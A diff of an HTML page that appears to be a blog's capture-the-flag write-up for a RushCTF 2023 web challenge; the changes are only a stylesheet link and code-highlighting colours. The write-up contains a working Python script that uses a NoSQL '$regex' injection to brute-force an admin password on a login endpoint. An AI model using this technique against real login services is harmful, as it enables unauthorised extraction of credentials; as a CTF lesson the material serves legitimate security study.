@@ -28,6 +28,10 @@
 
 
 
+    
+        <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    
+
 
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -157,7 +161,7 @@
                 <h2 id="note">Note</h2>
 <p>First <code>web</code> challenge from the RushCTF 2023. I liked this challege a lot and I learned a new thing about NoSQL injections. It might just be my favourite one from this CTF.</p>
 <h2 id="description">Description</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>My SecureVault was Hacked last year. It was because of that damm SQL language, see if you can get my password now! Goodluck
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>My SecureVault was Hacked last year. It was because of that damm SQL language, see if you can get my password now! Goodluck
 </span></span></code></pre></div><p>Hint: <em>SAY NO TO &hellip;</em></p>
 <h2 id="recon">Recon</h2>
 <p>Since the description talks about SQL, and the hint tells us to &ldquo;say <em>no</em> to &hellip;&rdquo; we can assume that we&rsquo;re going to do <code>NoSQL Injection</code>. Now, the goal si not only to bypass the login, but to get the admin&rsquo;s password.</p>
@@ -169,30 +173,30 @@
 <p><img src="https://user-images.githubusercontent.com/77807503/224516430-762081ce-70cf-42e0-b5c5-8b42dae14e36.png" alt="2023-03-12-001307_1166x455_scrot"></p>
 <p>But remember, the goal is not to connect, but to get the admin&rsquo;s password.</p>
 <p>Now that we know we can manipulate the NoSQL request, we can use <code>[$regex]</code> on the password and bruteforce each character. Let&rsquo;s make a python script to automate this.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-}&#34;</span>
-</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://challs.ctf.cafe:9999/login&#34;</span>
+</span></span><span style="display:flex;"><span>alphabet <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-}&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://challs.ctf.cafe:9999/login&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># We know the flag is going to look like RUSH{}</span>
-</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RUSH{&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># We know the flag is going to look like RUSH{}</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;RUSH{&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Infinite loop</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Infinite loop</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Loop through each possible char in the flag</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> alphabet:
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4"># Loop through each possible char in the flag</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> char <span style="color:#ff79c6">in</span> alphabet:
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># If the char is the correct one, the response will be a 200 OK</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># otherwise, it&#39;ll be a 403 forbidden</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># We use the $regex to guess wether the character we try is good or not</span>
-</span></span><span style="display:flex;"><span>		res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,
-</span></span><span style="display:flex;"><span>		json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: {<span style="color:#e6db74">&#34;$eq&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>}, <span style="color:#e6db74">&#34;password&#34;</span>: {<span style="color:#e6db74">&#34;$regex&#34;</span>: flag<span style="color:#f92672">+</span>char<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.*&#34;</span>}})
+</span></span><span style="display:flex;"><span>		<span style="color:#6272a4"># If the char is the correct one, the response will be a 200 OK</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#6272a4"># otherwise, it&#39;ll be a 403 forbidden</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#6272a4"># We use the $regex to guess wether the character we try is good or not</span>
+</span></span><span style="display:flex;"><span>		res <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url,
+</span></span><span style="display:flex;"><span>		json<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;username&#34;</span>: {<span style="color:#f1fa8c">&#34;$eq&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span>}, <span style="color:#f1fa8c">&#34;password&#34;</span>: {<span style="color:#f1fa8c">&#34;$regex&#34;</span>: flag<span style="color:#ff79c6">+</span>char<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;.*&#34;</span>}})
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># If it&#39;s not 403, it means the current character is the next one in the flag</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> res<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">403</span>:
-</span></span><span style="display:flex;"><span>			flag <span style="color:#f92672">+=</span> char
-</span></span><span style="display:flex;"><span>			print(char,<span style="color:#e6db74">&#34;is in the flag -- current flag:&#34;</span>,flag)
+</span></span><span style="display:flex;"><span>		<span style="color:#6272a4"># If it&#39;s not 403, it means the current character is the next one in the flag</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> res<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">403</span>:
+</span></span><span style="display:flex;"><span>			flag <span style="color:#ff79c6">+=</span> char
+</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">print</span>(char,<span style="color:#f1fa8c">&#34;is in the flag -- current flag:&#34;</span>,flag)
 </span></span></code></pre></div><p>Alright, let&rsquo;s test it (took about 5 minutes):</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/224516438-8b536928-3ebd-4a57-9bb6-6a90c4fe3d42.png" alt="2023-03-12-002954_1899x678_scrot"></p>
 <p>And it worked! GG !</p>
